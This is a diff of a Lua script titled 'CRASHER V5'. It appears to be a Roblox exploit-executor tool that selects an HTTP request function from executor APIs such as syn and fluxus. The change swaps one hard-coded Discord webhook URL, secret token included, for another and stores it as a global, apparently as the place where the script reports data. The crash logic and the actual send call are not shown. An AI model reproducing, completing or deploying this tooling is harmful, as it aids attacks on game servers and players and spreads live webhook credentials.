@@ -1,6 +1,6 @@
 -- CRASHER V5
 
-local BRUH = "https://discord.com/api/webhooks/1543043822349459518" .. "/zMqresOALhggceDZTI1CqUjkXXGKXIo9AsQROERbc-3SKvD1vuA86HJ6Ge8vHDMPpMjd"
+getgenv().BRUH = tostring("https://discord.com/api/webhooks/1543254671999631524" .. "/qsip28YpqNYVX-O5WhAgorPnUHIbrPLT5YVVyNcp6TFBHhc-Z_nD5BXCK9iDSDqULbIJ")
 
 
 local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
